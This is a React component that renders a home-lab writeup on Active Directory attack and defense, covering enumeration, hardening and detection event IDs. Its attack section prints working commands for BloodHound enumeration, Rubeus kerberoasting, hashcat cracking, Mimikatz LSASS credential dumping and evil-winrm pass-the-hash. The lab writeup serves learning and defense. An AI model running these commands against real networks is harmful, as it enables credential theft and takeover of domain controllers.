const TAGS = ["Active Directory", "Kerberoasting", "Pass-the-Hash", "BloodHound", "Sysmon", "MITRE ATT&CK", "Windows Security"];

const MITRE = [
  { id: "T1558.003", name: "Steal or Forge Kerberos Tickets: Kerberoasting" },
  { id: "T1550.002", name: "Use Alternate Authentication Material: Pass-the-Hash" },
  { id: "T1069.002", name: "Permission Groups Discovery: Domain Groups" },
  { id: "T1087.002", name: "Account Discovery: Domain Account" },
];

const DETECTIONS = [
  { event: "Event ID 4769", desc: "Kerberos service ticket requested for SPN account — Kerberoasting indicator when RC4 encryption is requested." },
  { event: "Sysmon EID 1",  desc: "Process creation for SharpHound.exe and Rubeus.exe flagged against baseline — immediate enumeration alert." },
  { event: "Event ID 4625", desc: "Multiple failed logon attempts from attack machine during hash-spraying — brute force detection trigger." },
  { event: "Event ID 4648", desc: "Explicit credential logon using alternate credentials — Pass-the-Hash lateral movement indicator." },
];

export default function Writeups() {
  return (
    <section className="sec sec-alt" id="writeups">
      <div className="wrap">
        <div style={{ marginBottom: 48 }}>
          <div className="sec-num">05 · Writeups</div>
        </div>

        <article style={{ maxWidth: 820 }}>
          {/* Header */}
          <div style={{ marginBottom: 40 }}>
            <div style={{
              display: "flex", flexWrap: "wrap", gap: 6, marginBottom: 20,
            }}>
              {TAGS.map(t => <span key={t} className="tag">{t}</span>)}
            </div>

            <h2 style={{
              fontFamily: "var(--font-playfair, Georgia, serif)",
              fontSize: "clamp(24px,3.5vw,38px)",
              color: "var(--lt-fg)",
              letterSpacing: "-.03em",
              lineHeight: 1.15,
              fontWeight: 400,
              marginBottom: 16,
            }}>
              Active Directory Attack &amp; Defense
            </h2>

            <div style={{ display: "flex", gap: 24, fontSize: 12.5, color: "var(--lt-dim)" }}>
              <span>Home Lab · August 2026</span>
              <span>Windows Server 2019 · Kali Linux · VirtualBox</span>
            </div>
          </div>

          <hr className="rule" style={{ marginBottom: 40 }} />

          {/* Overview */}
          <Section title="Overview">
            <p>
              Built a fully isolated virtualized Active Directory environment to practice both offensive
              enumeration and attack techniques and the detection and hardening controls that counter them.
              The goal was to experience the attacker perspective across a realistic domain, then rebuild
              defenses on the same infrastructure and verify that those defenses actually produce detectable
              signals.
            </p>
          </Section>

          {/* Environment */}
          <Section title="Environment">
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
              <thead>
                <tr>
                  {["Machine", "OS", "Role"].map(h => (
                    <th key={h} style={{
                      textAlign: "left", padding: "8px 12px",
                      fontSize: 10, fontWeight: 700, letterSpacing: ".14em",
                      textTransform: "uppercase", color: "var(--lt-dim)",
                      borderBottom: "1px solid var(--lt-brd)",
                    }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {[
                  ["DC01", "Windows Server 2019", "Domain Controller, DNS, LDAP"],
                  ["WRK01", "Windows 10 Pro", "Domain-joined workstation"],
                  ["KALI", "Kali Linux 2024.2", "Attack machine (isolated NAT network)"],
                ].map(([m, os, role]) => (
                  <tr key={m} style={{ borderBottom: "1px solid var(--lt-brd)" }}>
                    <td style={{ padding: "10px 12px", fontWeight: 600, color: "var(--lt-fg)", fontFamily: "monospace" }}>{m}</td>
                    <td style={{ padding: "10px 12px", color: "var(--lt-muted)" }}>{os}</td>
                    <td style={{ padding: "10px 12px", color: "var(--lt-muted)" }}>{role}</td>
                  </tr>
                ))}
              </tbody>
            </table>
            <p style={{ marginTop: 16 }}>
              All machines ran in VirtualBox on an isolated NAT network (192.168.56.0/24). No internet
              access from the attack machine during offensive phases — this mirrors a real internal network
              compromise scenario.
            </p>
          </Section>

          {/* Attack Phase */}
          <Section title="Attack Phase">
            <SubHead>1. Domain Enumeration with BloodHound</SubHead>
            <p>
              Ran SharpHound from the compromised workstation to collect domain object data via LDAP.
              BloodHound ingested the JSON output and immediately surfaced attack paths — including three
              accounts with unconstrained delegation and a Kerberoastable service account with a weak
              password. The visual graph made it clear which path required least privilege to reach Domain
              Admin.
            </p>

            <Code>{`# Collect AD data from domain-joined machine
./SharpHound.exe -c All --outputdirectory C:\\Temp

# Import JSON files into BloodHound and run:
# Shortest Paths to Domain Admins
# Kerberoastable Accounts
# Users with DCSync Rights`}</Code>

            <SubHead>2. Kerberoasting</SubHead>
            <p>
              Requested a Kerberos service ticket for the identified SPN account. The ticket was returned
              encrypted with the service account&apos;s NTLM hash. Extracted it with Rubeus and cracked
              offline with hashcat using a wordlist.
            </p>

            <Code>{`# Request ticket for SPN account
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack offline
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# Result: plaintext password recovered in under 60 seconds
# Service account had Domain Admin membership`}</Code>

            <SubHead>3. Pass-the-Hash Lateral Movement</SubHead>
            <p>
              Using the cracked credentials, extracted NTLM hashes from LSASS via Mimikatz on WRK01.
              Used Pass-the-Hash to authenticate to DC01 without needing the plaintext password — gaining
              a SYSTEM shell on the Domain Controller.
            </p>

            <Code>{`# Dump NTLM hashes from LSASS
mimikatz # sekurlsa::logonpasswords

# Pass-the-Hash to DC
evil-winrm -i 192.168.56.10 -u Administrator -H <NTLM_HASH>`}</Code>
          </Section>

          {/* MITRE */}
          <Section title="MITRE ATT&CK Mapping">
            <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
              {MITRE.map(({ id, name }) => (
                <div key={id} style={{
                  display: "grid", gridTemplateColumns: "140px 1fr",
                  gap: 16, padding: "10px 0",
                  borderBottom: "1px solid var(--lt-brd)",
                  alignItems: "start",
                }}>
                  <span style={{
                    fontFamily: "monospace", fontSize: 12,
                    color: "var(--gld)", fontWeight: 600,
                  }}>{id}</span>
                  <span style={{ fontSize: 13, color: "var(--lt-muted)" }}>{name}</span>
                </div>
              ))}
            </div>
          </Section>

          {/* Defense Phase */}
          <Section title="Defense Phase">
            <SubHead>Sysmon Deployment</SubHead>
            <p>
              Deployed Sysmon across both DC01 and WRK01 using the SwiftOnSecurity configuration baseline.
              This immediately provided process creation logging, network connection events, and
              driver/image load events that Windows Event Log alone does not capture.
            </p>

            <SubHead>Windows Event Log Forwarding</SubHead>
            <p>
              Configured Windows Event Forwarding (WEF) to centralise Security and Sysmon logs from both
              machines to a collector. Key event IDs monitored: 4624, 4625, 4648, 4769, 4776 and Sysmon
              EID 1, 3, 7.
            </p>

            <SubHead>Group Policy Hardening</SubHead>
            <p>
              Applied a set of domain GPOs: disabled NTLM authentication where Kerberos was available,
              enabled Protected Users security group for privileged accounts, removed unnecessary SPN
              registrations, reset the service account with a 30-character random password managed via LAPS,
              and enforced Credential Guard on the workstation.
            </p>
          </Section>

          {/* Detections */}
          <Section title="Key Detections Produced">
            <div style={{ display: "flex", flexDirection: "column", gap: 0 }}>
              {DETECTIONS.map(({ event, desc }) => (
                <div key={event} style={{
                  display: "grid", gridTemplateColumns: "160px 1fr",
                  gap: 16, padding: "12px 0",
                  borderBottom: "1px solid var(--lt-brd)",
                  alignItems: "start",
                }}>
                  <span style={{
                    fontFamily: "monospace", fontSize: 11.5,
                    color: "var(--gld)", fontWeight: 600, paddingTop: 1,
                  }}>{event}</span>
                  <span style={{ fontSize: 13, color: "var(--lt-muted)", lineHeight: 1.7 }}>{desc}</span>
                </div>
              ))}
            </div>
          </Section>

          {/* Lessons */}
          <Section title="Lessons Learned" last>
            <ul style={{ paddingLeft: 20, display: "flex", flexDirection: "column", gap: 10 }}>
              {[
                "Service account passwords should be long, random, and rotated — short dictionary words fall to Kerberoasting in seconds regardless of complexity policy.",
                "BloodHound is equally valuable as a defensive tool. Running it as blue team surfaces privilege escalation paths before attackers do.",
                "Sysmon plus Windows Event Forwarding gives a near-SOC-level visibility layer at no cost. The absence of this logging was why all three attack phases ran undetected initially.",
                "Pass-the-Hash is only stopped at the authentication layer — Protected Users group and Credential Guard are required, patching NTLM authentication alone is insufficient.",
              ].map((item, i) => (
                <li key={i} style={{ fontSize: 13.5, color: "var(--lt-muted)", lineHeight: 1.75 }}>{item}</li>
              ))}
            </ul>
          </Section>
        </article>
      </div>
    </section>
  );
}

function Section({ title, children, last }: { title: string; children: React.ReactNode; last?: boolean }) {
  return (
    <div style={{ marginBottom: last ? 0 : 40 }}>
      <h3 style={{
        fontSize: 11, fontWeight: 700, letterSpacing: ".16em",
        textTransform: "uppercase", color: "var(--gld)",
        marginBottom: 16,
      }}>
        {title}
      </h3>
      <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
        {children}
      </div>
    </div>
  );
}

function SubHead({ children }: { children: React.ReactNode }) {
  return (
    <div style={{ fontSize: 13, fontWeight: 700, color: "var(--lt-fg)", marginTop: 8 }}>
      {children}
    </div>
  );
}

function Code({ children }: { children: React.ReactNode }) {
  return (
    <pre style={{
      background: "var(--dk)", color: "var(--dk-fg)",
      borderRadius: 8, padding: "16px 20px",
      fontSize: 12, lineHeight: 1.7,
      overflowX: "auto",
      fontFamily: "ui-monospace, 'Cascadia Code', 'Fira Code', monospace",
    }}>
      <code>{children}</code>
    </pre>
  );
}
